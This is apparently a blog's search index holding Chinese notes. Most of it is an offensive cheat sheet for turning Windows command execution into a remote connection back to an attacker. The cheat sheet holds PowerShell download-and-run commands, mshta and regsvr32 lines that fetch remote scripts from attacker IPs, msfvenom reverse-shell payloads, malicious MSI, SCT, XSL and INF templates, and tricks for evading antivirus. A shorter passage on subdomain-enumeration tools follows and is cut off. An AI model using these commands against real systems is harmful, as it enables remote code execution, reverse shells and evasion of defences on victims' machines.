<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>在命令执行的情况下上线的几种方式-Windows</title>
    <url>/2021/01/13/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        对Windows的系统，经常会出现可以执行命令，但无法上线或是拿shell的情况<a id="more"></a>。针对Windows的上线分为远程执行和本地运行，以下就两种利用方式把从各类技巧做一个汇总。</p>
<hr>
<h2 id="远程执行"><a href="#远程执行" class="headerlink" title="远程执行"></a>远程执行</h2><h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><h4 id="远程下载执行-base64"><a href="#远程下载执行-base64" class="headerlink" title="远程下载执行+base64"></a>远程下载执行+base64</h4><p>下载并base64</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$fileContent &#x3D; &quot;(new-object System.Net.WebClient).DownloadFile(&#39;https:&#x2F;&#x2F;github.com&#x2F;3gstudent&#x2F;test&#x2F;raw&#x2F;master&#x2F;putty.exe&#39;,&#39;c:\download\a.exe&#39;);start-process &#39;c:\download\a.exe&#39;&quot;</span><br><span class="line">$bytes  &#x3D; [System.Text.Encoding]::Unicode.GetBytes($fileContent);</span><br><span class="line">$encoded &#x3D; [System.Convert]::ToBase64String($bytes); </span><br><span class="line">$encoded</span><br></pre></td></tr></table></figure>
<p>执行</p>
<p>powershell -WindowStyle Hidden -enc base64</p>
<h3 id="mshta方式"><a href="#mshta方式" class="headerlink" title="mshta方式"></a>mshta方式</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">执行vb</span><br><span class="line">	&gt;mshta vbscript:CreateObject(&quot;Wscript.Shell&quot;).Run(&quot;calc.exe&quot;,0,true)(window.close)</span><br><span class="line">	</span><br><span class="line">Js</span><br><span class="line">	&gt;mshta javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h&#x3D;new%20ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;calc.exe&quot;,0,true);try&#123;h.Send();b&#x3D;h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd &#x2F;c taskkill &#x2F;f &#x2F;im mshta.exe&quot;,0,true);&#125;</span><br><span class="line">	</span><br><span class="line">Jsrat</span><br><span class="line">	&gt;mshta javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h&#x3D;new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http:&#x2F;&#x2F;192.168.2.101:9998&#x2F;connect&quot;,false);try&#123;h.Send();b&#x3D;h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd &#x2F;c taskkill &#x2F;f &#x2F;im mshta.exe&quot;,0,true);&#125;</span><br></pre></td></tr></table></figure>
<h4 id="metaspolit模块"><a href="#metaspolit模块" class="headerlink" title="metaspolit模块"></a>metaspolit模块</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;misc&#x2F;hta_server</span><br><span class="line">mshta xxx</span><br><span class="line">执行mshta xxxxx</span><br></pre></td></tr></table></figure>
<h4 id="配合CACTUSTORCH"><a href="#配合CACTUSTORCH" class="headerlink" title="配合CACTUSTORCH"></a>配合CACTUSTORCH</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">下载 https:&#x2F;&#x2F;github.com&#x2F;mdsecactivebreach&#x2F;CACTUSTORCH</span><br><span class="line">生成raw格式的shellcode并base64</span><br><span class="line">	base64从文件快速编码命令：cat 1.bin |base64 -w 0</span><br><span class="line">修改CACTUSTORCH.hta文件中Dim code处的内容为base64后的shellcode</span><br><span class="line">执行mshta http:&#x2F;&#x2F;x.x.x.x&#x2F;CACTUSTORCH.hta</span><br></pre></td></tr></table></figure>
<h4 id="配合GreatSCT"><a href="#配合GreatSCT" class="headerlink" title="配合GreatSCT"></a>配合GreatSCT</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use Bypass</span><br><span class="line">use mshta&#x2F;shellcode_inject&#x2F;base64_migrate</span><br></pre></td></tr></table></figure>
<h3 id="msiexec方式"><a href="#msiexec方式" class="headerlink" title="msiexec方式"></a>msiexec方式</h3><p>可以将msi后缀改为png</p>
<h4 id="metaspolit模块-1"><a href="#metaspolit模块-1" class="headerlink" title="metaspolit模块"></a>metaspolit模块</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.107 lport&#x3D;1234 –f msi &gt; shell.msi</span><br><span class="line">msiexec &#x2F;q &#x2F;i http:&#x2F;&#x2F;x.x.x.x&#x2F;shell.msi</span><br></pre></td></tr></table></figure>
<h4 id="自编译msi"><a href="#自编译msi" class="headerlink" title="自编译msi"></a>自编译msi</h4><p>修改恶意msi.wix文件中要执行的命令</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Wix</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.microsoft.com/wix/2006/wi&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Product</span> <span class="attr">Id</span>=<span class="string">&quot;*&quot;</span> <span class="attr">UpgradeCode</span>=<span class="string">&quot;12345678-1234-1234-1234-111111111111&quot;</span> <span class="attr">Name</span>=<span class="string">&quot;Example Product </span></span></span><br><span class="line"><span class="tag"><span class="string">Name&quot;</span> <span class="attr">Version</span>=<span class="string">&quot;0.0.1&quot;</span> <span class="attr">Manufacturer</span>=<span class="string">&quot;@_xpn_&quot;</span> <span class="attr">Language</span>=<span class="string">&quot;1033&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Package</span> <span class="attr">InstallerVersion</span>=<span class="string">&quot;200&quot;</span> <span class="attr">Compressed</span>=<span class="string">&quot;yes&quot;</span> <span class="attr">Comments</span>=<span class="string">&quot;Windows Installer Package&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Media</span> <span class="attr">Id</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Directory</span> <span class="attr">Id</span>=<span class="string">&quot;TARGETDIR&quot;</span> <span class="attr">Name</span>=<span class="string">&quot;SourceDir&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Directory</span> <span class="attr">Id</span>=<span class="string">&quot;ProgramFilesFolder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Directory</span> <span class="attr">Id</span>=<span class="string">&quot;INSTALLLOCATION&quot;</span> <span class="attr">Name</span>=<span class="string">&quot;Example&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">Component</span> <span class="attr">Id</span>=<span class="string">&quot;ApplicationFiles&quot;</span> <span class="attr">Guid</span>=<span class="string">&quot;12345678-1234-1234-1234-222222222222&quot;</span>&gt;</span>     </span><br><span class="line">          <span class="tag">&lt;/<span class="name">Component</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Feature</span> <span class="attr">Id</span>=<span class="string">&quot;DefaultFeature&quot;</span> <span class="attr">Level</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ComponentRef</span> <span class="attr">Id</span>=<span class="string">&quot;ApplicationFiles&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Feature</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Property</span> <span class="attr">Id</span>=<span class="string">&quot;cmdline&quot;</span>&gt;</span>calc</span><br><span class="line">    <span class="tag">&lt;/<span class="name">Property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">CustomAction</span> <span class="attr">Id</span>=<span class="string">&quot;SystemShell&quot;</span> <span class="attr">Execute</span>=<span class="string">&quot;deferred&quot;</span> <span class="attr">Directory</span>=<span class="string">&quot;TARGETDIR&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">ExeCommand</span>=<span class="string">&#x27;[cmdline]&#x27;</span> <span class="attr">Return</span>=<span class="string">&quot;ignore&quot;</span> <span class="attr">Impersonate</span>=<span class="string">&quot;no&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">CustomAction</span> <span class="attr">Id</span>=<span class="string">&quot;FailInstall&quot;</span> <span class="attr">Execute</span>=<span class="string">&quot;deferred&quot;</span> <span class="attr">Script</span>=<span class="string">&quot;vbscript&quot;</span> <span class="attr">Return</span>=<span class="string">&quot;check&quot;</span>&gt;</span></span><br><span class="line">      invalid vbs to fail install</span><br><span class="line">    <span class="tag">&lt;/<span class="name">CustomAction</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">InstallExecuteSequence</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Custom</span> <span class="attr">Action</span>=<span class="string">&quot;SystemShell&quot;</span> <span class="attr">After</span>=<span class="string">&quot;InstallInitialize&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Custom</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Custom</span> <span class="attr">Action</span>=<span class="string">&quot;FailInstall&quot;</span> <span class="attr">Before</span>=<span class="string">&quot;InstallFiles&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Custom</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">InstallExecuteSequence</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Product</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Wix</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用wix工具编译生成msi</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">candle.exe msi.wix</span><br><span class="line">light.exe xxx.wixobj</span><br></pre></td></tr></table></figure>
<h4 id="exe转msi"><a href="#exe转msi" class="headerlink" title="exe转msi"></a>exe转msi</h4><p>使用exe2msi.msi工具将exe转为msi</p>
<p>如果exe是免杀的，那么这样一来就可以无需exe落地就能远程执行</p>
<h3 id="regsvr32方式"><a href="#regsvr32方式" class="headerlink" title="regsvr32方式"></a>regsvr32方式</h3><h4 id="配合metaspolit模块"><a href="#配合metaspolit模块" class="headerlink" title="配合metaspolit模块"></a>配合metaspolit模块</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;script&#x2F;web_delivery</span><br><span class="line">regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;x.x.x.x&#x2F;file.sct scrobj.dll</span><br></pre></td></tr></table></figure>
<h4 id="配合empire"><a href="#配合empire" class="headerlink" title="配合empire"></a>配合empire</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uselistner http			#开启监听</span><br><span class="line">set Host http:&#x2F;&#x2F;192.168.1.109 #设置监听地址</span><br><span class="line">execute		#运行监听</span><br><span class="line">usestager windows&#x2F;launcher_sct  #选择模块</span><br><span class="line">set listener http	#选择监听</span><br><span class="line">execute		#运行模块</span><br><span class="line">regsvr &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;192.168.1.109:8080&#x2F;tmp&#x2F;launcher.sct scrobj.dll</span><br></pre></td></tr></table></figure>
<h4 id="自定义SCT文件"><a href="#自定义SCT文件" class="headerlink" title="自定义SCT文件"></a>自定义SCT文件</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?XML version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scriptlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">registration</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">progid</span>=<span class="string">&quot;PoC&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">classid</span>=<span class="string">&quot;&#123;F0001111-0000-0000-0000-0000FEEDACDC&#125;&quot;</span> &gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- Proof Of Concept - Casey Smith @subTee --&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--  License: BSD3-Clause --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;JScript&quot;</span>&gt;</span></span><br><span class="line">		&lt;![CDATA[</span><br><span class="line">	</span><br><span class="line"><span class="javascript">			<span class="keyword">var</span> r = <span class="keyword">new</span> ActiveXObject(<span class="string">&quot;WScript.Shell&quot;</span>).Run(<span class="string">&quot;calc.exe&quot;</span>);	</span></span><br><span class="line">	</span><br><span class="line">		]]&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">registration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scriptlet</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>执行：regsvr32 /u /n /s /i:<a href="http://192.168.1.109/1.sct">http://192.168.1.109/1.sct</a> scrobj.dll</p>
<h4 id="配合koadic"><a href="#配合koadic" class="headerlink" title="配合koadic"></a>配合koadic</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use stager&#x2F;js&#x2F;regsvr</span><br><span class="line">set srvhost 192.168.1.107</span><br><span class="line">run</span><br><span class="line">regsvr32 &#x2F;u &#x2F;n &#x2F;s &#x2F;i:http;&#x2F;&#x2F;192.168.1.107:9998&#x2F;uWBjv scrobj.dll</span><br><span class="line">zombies 0</span><br></pre></td></tr></table></figure>
<h4 id="配合JSRat"><a href="#配合JSRat" class="headerlink" title="配合JSRat"></a>配合JSRat</h4><p>下载<a href="https://github.com/Hood3dRob1n/JSRat-Py">https://github.com/Hood3dRob1n/JSRat-Py</a></p>
<p>在本机执行./JSRat.py -I 0.0.0.0 -p 9999后，脚本会自动生成命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JSRat Server - Python Implementation</span><br><span class="line">By: Hood3dRob1n</span><br><span class="line"></span><br><span class="line">[*] Web Server Started on Port: 9999</span><br><span class="line">[*] Awaiting Client Connection to:</span><br><span class="line">   [*] rundll32 invocation: http:&#x2F;&#x2F;0.0.0.0:9999&#x2F;connect</span><br><span class="line">   [*] regsvr32 invocation: http:&#x2F;&#x2F;0.0.0.0:9999&#x2F;file.sct</span><br><span class="line">      [*] Client Command at: http:&#x2F;&#x2F;0.0.0.0:9999&#x2F;wtf</span><br><span class="line">      [*] Browser Hook Set at: http:&#x2F;&#x2F;0.0.0.0:9999&#x2F;hook</span><br><span class="line"></span><br><span class="line">[-] Hit CTRL+C to Stop the Server at any time...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="配合GreatSCT-1"><a href="#配合GreatSCT-1" class="headerlink" title="配合GreatSCT"></a>配合GreatSCT</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use Bypass</span><br><span class="line">use regsvr&#x2F;shellcode_iject&#x2F;base64_migrate.py</span><br><span class="line">generate</span><br></pre></td></tr></table></figure>
<h4 id="Bypass的一些方式"><a href="#Bypass的一些方式" class="headerlink" title="Bypass的一些方式"></a>Bypass的一些方式</h4><h5 id="使用命令绕过"><a href="#使用命令绕过" class="headerlink" title="使用命令绕过"></a>使用命令绕过</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">字符干扰</span><br><span class="line">regsvr32 &#x2F;u &#x2F;n &#x2F;s &#x2F;i:h^t^t^p:&#x2F;&#x2F;192.168.122.1&#x2F;2021.sct scrobj.dll</span><br><span class="line">regsvr32 &#x2F;u &#x2F;n &#x2F;s &#x2F;i:h&quot;t&quot;t&quot;p:&#x2F;&#x2F;192.168.122.1&#x2F;2021.sct scrobj.dll</span><br><span class="line"></span><br><span class="line">目录移动</span><br><span class="line">copy c:\windows\system32\regsvr32.exe  C:\Users\Administrator\Desktop\regs.exe</span><br><span class="line">regs.exe &#x2F;u &#x2F;n &#x2F;s &#x2F;i:http:&#x2F;&#x2F;192.168.122.1&#x2F;2021.sct scrobj.dll</span><br><span class="line">copy c:\windows\system32\scrobj.dll newscrobj.dll</span><br><span class="line">regsvr32 &#x2F;u &#x2F;n &#x2F;s &#x2F;i:http:&#x2F;&#x2F;192.168.122.1&#x2F;2021.sct newscrobj.dll</span><br><span class="line"></span><br><span class="line">符号链接，需要链接的dll目录下进行</span><br><span class="line">Mklink.exe c:\programdata\Myscrobj.dll c:\windows\system32\scrobj.dll</span><br><span class="line">regsvr32 &#x2F;u &#x2F;n &#x2F;s &#x2F;i:http:&#x2F;&#x2F;192.168.122.1&#x2F;2021.sct Myscrobj.dll</span><br><span class="line"></span><br><span class="line">数据流（ADS）</span><br><span class="line">type c:\windows\system32\scrobj.dll &gt; test.txt:new1.dll</span><br><span class="line">regsvr32 &#x2F;u &#x2F;n &#x2F;s &#x2F;i:http:&#x2F;&#x2F;192.168.122.1&#x2F;2021.sct test.txt:new1.dll</span><br><span class="line"></span><br><span class="line">本地运行</span><br><span class="line">bitsadmin &#x2F;transfer download &#x2F;download &#x2F;priority normal http:&#x2F;&#x2F;192.168.122.1&#x2F;2021.sct %TEMP%\new2021.txt &amp;&amp; regsvr32.exe &#x2F;s &#x2F;u &#x2F;i:%TEMP%\new2021.txt scrobj.dll</span><br></pre></td></tr></table></figure>
<h5 id="远程调用本地加载"><a href="#远程调用本地加载" class="headerlink" title="远程调用本地加载"></a>远程调用本地加载</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;tchar.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    TCHAR *dllpath &#x3D; _T(&quot;c:\\windows\\system32\\scrobj.dll&quot;);</span><br><span class="line">    HMODULE hDllScr &#x3D; LoadLibrary(dllpath);</span><br><span class="line">    if (hDllScr &#x3D;&#x3D; NULL)</span><br><span class="line">    &#123;</span><br><span class="line">        puts(&quot;Load scrobj.dll fail!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    puts(&quot;Load scrobj.dll success!&quot;);</span><br><span class="line">    printf(&quot;Address: %p\n&quot;, hDllScr);</span><br><span class="line">    void* DllInstallProcAddr &#x3D; (void*)GetProcAddress(hDllScr, &quot;DllInstall&quot;);</span><br><span class="line">    if (DllInstallProcAddr &#x3D;&#x3D; NULL)</span><br><span class="line">    &#123;</span><br><span class="line">        puts(&quot;Can not found DllInstall in scrobj.dll!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;Found Dllinstall(%p) in scrobj.dll!&quot;, DllInstallProcAddr);</span><br><span class="line">    ((void (*)(BOOL, TCHAR*))DllInstallProcAddr)(FALSE, L&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;ttt.txt&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>远程调用的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?XML version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;component id&#x3D;&quot;TESTING&quot;&gt;</span><br><span class="line">&lt;registration</span><br><span class="line">  progid&#x3D;&quot;TESTING&quot;</span><br><span class="line">  classid&#x3D;&quot;&#123;A1112221-0000-0000-3000-000DA00DABFC&#125;&quot; &gt;</span><br><span class="line"></span><br><span class="line">  &lt;script language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">    &lt;![CDATA[</span><br><span class="line">      var wsc &#x3D; &quot;WScript.Shell&quot;;</span><br><span class="line">      var com &#x3D; &quot;calc.exe&quot;;</span><br><span class="line">      var foo &#x3D; new ActiveXObject(wsc).Run(com);</span><br><span class="line">    ]]&gt;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;registration&gt;</span><br><span class="line">&lt;&#x2F;component&gt;</span><br></pre></td></tr></table></figure>
<h3 id="rundll32方式"><a href="#rundll32方式" class="headerlink" title="rundll32方式"></a>rundll32方式</h3><h4 id="metaspolit模块-2"><a href="#metaspolit模块-2" class="headerlink" title="metaspolit模块"></a>metaspolit模块</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.107 lport&#x3D;1234 -f dll &gt; 1.dll</span><br><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;smb_delivery</span><br><span class="line">rundll32.exe \\192.168.1.107\ZtmW\test.dll,0</span><br></pre></td></tr></table></figure>
<h4 id="配合Koadic"><a href="#配合Koadic" class="headerlink" title="配合Koadic"></a>配合Koadic</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use stager&#x2F;js&#x2F;rundll32_js</span><br><span class="line">set SRVHOST 192.168.1.107</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<h3 id="SCT文件直接利用"><a href="#SCT文件直接利用" class="headerlink" title="SCT文件直接利用"></a>SCT文件直接利用</h3><h4 id="pubprn-vbs结合SCT文件利用"><a href="#pubprn-vbs结合SCT文件利用" class="headerlink" title="pubprn.vbs结合SCT文件利用"></a>pubprn.vbs结合SCT文件利用</h4><p>windows7下未成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cscript &#x2F;b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:http:&#x2F;&#x2F;10.100.18.20:8000&#x2F;1.sct</span><br></pre></td></tr></table></figure>
<h4 id="配合empire-1"><a href="#配合empire-1" class="headerlink" title="配合empire"></a>配合empire</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">listeners</span><br><span class="line">uselistener http</span><br><span class="line">set Host 192.168.1.109</span><br><span class="line">execute</span><br><span class="line">usestager windows&#x2F;launcher_sct</span><br><span class="line">set Listener HTTP</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
<h3 id="WMIC利用xsl方式"><a href="#WMIC利用xsl方式" class="headerlink" title="WMIC利用xsl方式"></a>WMIC利用xsl方式</h3><h4 id="配合koadic-1"><a href="#配合koadic-1" class="headerlink" title="配合koadic"></a>配合koadic</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zerosum0x0&#x2F;koadic</span><br><span class="line">use stager&#x2F;js&#x2F;wmic</span><br><span class="line">set SRVHOST 192.168.1.107</span><br><span class="line">run</span><br><span class="line">wmic os get &#x2F;FORMAT:&quot;http:&#x2F;&#x2F;192.168.1.109&#x2F;payload.xsl&quot;</span><br></pre></td></tr></table></figure>
<h4 id="自定义xsl"><a href="#自定义xsl" class="headerlink" title="自定义xsl"></a>自定义xsl</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&#39;1.0&#39;?&gt;</span><br><span class="line">&lt;stylesheet</span><br><span class="line">xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;XSL&#x2F;Transform&quot; xmlns:ms&#x3D;&quot;urn:schemas-microsoft-com:xslt&quot;</span><br><span class="line">xmlns:user&#x3D;&quot;placeholder&quot;</span><br><span class="line">version&#x3D;&quot;1.0&quot;&gt;</span><br><span class="line">&lt;output method&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">	&lt;ms:script implements-prefix&#x3D;&quot;user&quot; language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">	&lt;![CDATA[</span><br><span class="line">	var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc&quot;);</span><br><span class="line">	]]&gt; &lt;&#x2F;ms:script&gt;</span><br><span class="line">&lt;&#x2F;stylesheet&gt;</span><br></pre></td></tr></table></figure>
<h2 id="本地执行"><a href="#本地执行" class="headerlink" title="本地执行"></a>本地执行</h2><p>一般而言，本地执行的BypassAV的能力都比远程强，缺点就是文件落地难。</p>
<h3 id="MSbuild-exe利用"><a href="#MSbuild-exe利用" class="headerlink" title="MSbuild.exe利用"></a>MSbuild.exe利用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;45.76.107.177 lport&#x3D;6677 -f csharp</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe  exp.csproj  （改为XML格式也可）</span><br></pre></td></tr></table></figure>
<h3 id="INF文件利用"><a href="#INF文件利用" class="headerlink" title="INF文件利用"></a>INF文件利用</h3><h4 id="配合cmstp-exe"><a href="#配合cmstp-exe" class="headerlink" title="配合cmstp.exe"></a>配合cmstp.exe</h4><p>依靠加载远程sct文件利用</p>
<p>新建一个inf，在代码处填入恶意sct文件。</p>
<p>然后运行cmstp.exe /s shell.inf</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[version]</span></span><br><span class="line"><span class="attr">Signature</span>=<span class="variable">$chicago</span>$</span><br><span class="line"><span class="attr">AdvancedINF</span>=<span class="number">2.5</span></span><br><span class="line"></span><br><span class="line"><span class="section">[DefaultInstall_SingleUser]</span></span><br><span class="line"><span class="attr">UnRegisterOCXs</span>=UnRegisterOCXSection</span><br><span class="line"></span><br><span class="line"><span class="section">[UnRegisterOCXSection]</span></span><br><span class="line">%11%\scrobj.dll,NI,https://gist.githubusercontent.com/NickTyrer/0604bb9d7bcfef9e0cf82c28a7b76f0f/raw/676451571c203303a95b95fcb29c8b7deb8a66e0/powersct.sct</span><br><span class="line"></span><br><span class="line"><span class="section">[Strings]</span></span><br><span class="line"><span class="attr">AppAct</span> = <span class="string">&quot;SOFTWARE\Microsoft\Connection Manager&quot;</span></span><br><span class="line"><span class="attr">ServiceName</span>=<span class="string">&quot;Yay&quot;</span></span><br><span class="line"><span class="attr">ShortSvcName</span>=<span class="string">&quot;Yay&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="配合InfDefaultInstall-exe"><a href="#配合InfDefaultInstall-exe" class="headerlink" title="配合InfDefaultInstall.exe"></a>配合InfDefaultInstall.exe</h4><p>运行InfDefaultInstall.exe shady.inf</p>
<h2 id="以上"><a href="#以上" class="headerlink" title="以上"></a>以上</h2>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>上线</tag>
      </tags>
  </entry>
  <entry>
    <title>Web的信息搜集</title>
    <url>/2021/01/14/Web%E7%9A%84%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    <content><![CDATA[<p><em>Web的信息搜集也很重要</em><a id="more"></a></p>
<p>记录一下自己常用的工具，不多。整一堆乱七八糟的信息搜集工具，真正上了的时候到底用哪个呢？</p>
<h1 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h1><h2 id="DomainNamePredictor"><a href="#DomainNamePredictor" class="headerlink" title="DomainNamePredictor"></a>DomainNamePredictor</h2><p>LandGrey写的的一款新工具，可以理解为强域名探测工具</p>
<p><a href="https://github.com/LandGrey/domainNamePredictor">https://github.com/LandGrey/domainNamePredictor</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python dnp.py -d A.com</span><br><span class="line">python dnp.py -f A.com-domains.txt -m simple</span><br><span class="line">python dnp.py -d demo.A.com -m simple -o &#x2F;tmp&#x2F;predictor-a.com.txt</span><br></pre></td></tr></table></figure>
<h2 id="kSubDomain"><a href="#kSubDomain" class="headerlink" title="kSubDomain"></a>kSubDomain</h2><p>知道创宇404团队写的的子域名爆破工具，可用来爆破三级、四级域名</p>
<p><a href="https://github.com/knownsec/ksubdomain">https://github.com/knownsec/ksubdomain</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用内置字典爆破</span><br><span class="line">ksubdomain -d seebug.org</span><br><span class="line"></span><br><span class="line">使用字典爆破域名</span><br><span class="line">ksubdomain -d seebug.org -f subdomains.dict</span><br><span class="line"></span><br><span class="line">字典里都是域名，可使用验证模式</span><br><span class="line">ksubdomain -f dns.txt -verify</span><br><span class="line"></span><br><span class="line">爆破三级域名</span><br><span class="line">ksubdomain -d seebug.org -l 2</span><br><span class="line"></span><br><span class="line">通过管道爆破</span><br><span class="line">echo &quot;seebug.org&quot;|ksubdomain</span><br><span class="line"></span><br><span class="line">通过管道验证域名</span><br><span class="line">echo &quot;paper.seebug.org&quot;|ksubdomain -verify</span><br><span class="line"></span><br><span class="line">仅使用网络API接口获取域名</span><br><span class="line">ksubdomain -d seebug.org -api</span><br><span class="line"></span><br><span class="line">完整模式,先使用网络API，在此基础使用内置字典进行爆破</span><br><span class="line">ksubdomain -d seebug.org -full</span><br></pre></td></tr></table></figure>
<h2 id="OneForAll"><a href="#OneForAll" class="headerlink" title="OneForAll"></a>OneForAll</h2><p>多功能集一体的子域名查询/爆破工具，一定要改配置文件添加上自己的各种接口，改了才好用</p>
